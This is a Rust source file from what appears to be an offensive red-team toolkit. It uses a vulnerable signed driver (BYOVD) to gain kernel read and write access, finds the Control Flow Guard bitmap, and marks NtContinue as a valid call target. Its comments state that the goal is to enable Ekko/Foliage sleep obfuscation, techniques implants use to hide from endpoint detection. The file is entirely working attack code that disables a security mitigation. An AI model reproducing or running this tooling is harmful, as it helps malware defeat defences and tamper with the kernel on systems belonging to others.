//! cfg-write: minimal standalone CFG bitmap writer.
//! Opens the Shield device (driver must already be running) via the kernelsdk
//! `ByovdDriver`, finds the CFG bitmap, and marks NtContinue as a valid
//! indirect call target — enabling Ekko/Foliage sleep obfuscation on
//! CFG-enabled processes.
#![cfg_attr(not(target_os = "windows"), allow(dead_code))]

#[cfg(target_os = "windows")]
fn main() {
    use nyx_operator_kernelsdk::byovd::ByovdDriver;
    use nyx_operator_kernelsdk::byovd_drivers::Shield;
    use nyx_operator_kernelsdk::KernelRw;

    let krw = match unsafe { ByovdDriver::open(Box::new(Shield)) } {
        Ok(k) => k,
        Err(e) => {
            eprintln!("[!] Cannot open \\\\.\\EAZShield: {e}");
            std::process::exit(1);
        }
    };
    eprintln!("[+] \\\\.\\EAZShield opened");

    let ntdll = unsafe { GetModuleHandleA(c"ntdll.dll".as_ptr().cast::<u8>()) };
    let nt_continue =
        unsafe { GetProcAddress(ntdll, c"NtContinue".as_ptr().cast::<u8>()) } as usize;
    eprintln!("[*] NtContinue = 0x{nt_continue:x}");

    let init =
        unsafe { GetProcAddress(ntdll, c"LdrSystemDllInitBlock".as_ptr().cast::<u8>()) } as usize;
    let sz = unsafe { *(init as *const u32) } as usize;
    eprintln!("[*] LdrSystemDllInitBlock size=0x{sz:x}");

    // kernel-tools-4: use the SHARED offset selection from operator-kernelsdk
    // (cfg::cfg_bitmap_offset) — this binary used to compute its own mapping
    // (0x40/0xC0/0xC8) that disagreed with nyx-kernel cfg-bypass (0x40/0x60/0x68)
    // for the same block sizes, so one of them always missed the bitmap.
    let off = nyx_operator_kernelsdk::cfg::cfg_bitmap_offset(sz);
    let bm = unsafe { *((init + off) as *const usize) };
    let bs = unsafe { *((init + off + 8) as *const usize) };
    eprintln!("[*] CFG bitmap=0x{bm:x} size=0x{bs:x}");
    if bm == 0 || bs == 0 {
        eprintln!("[!] no bitmap");
        std::process::exit(1);
    }

    let bit = nt_continue >> 4;
    let bo = bit >> 3;
    let bp = (bit & 7) as u8;
    let va = bm + bo;
    eprintln!("[*] target VA=0x{va:x} byte_off={bo} bit={bp}");

    let mut old = [0u8; 1];
    if let Err(e) = krw.kread(va, &mut old) {
        eprintln!("[!] kernel read fail: {e}");
        std::process::exit(1);
    }
    let was = (old[0] >> bp) & 1;
    eprintln!("[*] old_byte=0x{:02x} was_set={was}", old[0]);

    let new = old[0] | (1 << bp);
    if new == old[0] {
        eprintln!("[+] already set");
        return;
    }

    if let Err(e) = krw.kwrite(va, &[new]) {
        eprintln!("[!] kernel write fail: {e}");
        std::process::exit(1);
    }

    eprintln!("[+] NtContinue CFG bit SET — Ekko/Foliage enabled!");
}

#[cfg(target_os = "windows")]
extern "system" {
    fn GetModuleHandleA(n: *const u8) -> *mut std::ffi::c_void;
    fn GetProcAddress(h: *mut std::ffi::c_void, n: *const u8) -> *mut std::ffi::c_void;
}

#[cfg(not(target_os = "windows"))]
fn main() {
    eprintln!("cfg-write: Windows-only diagnostic; nothing to do on this host");
}
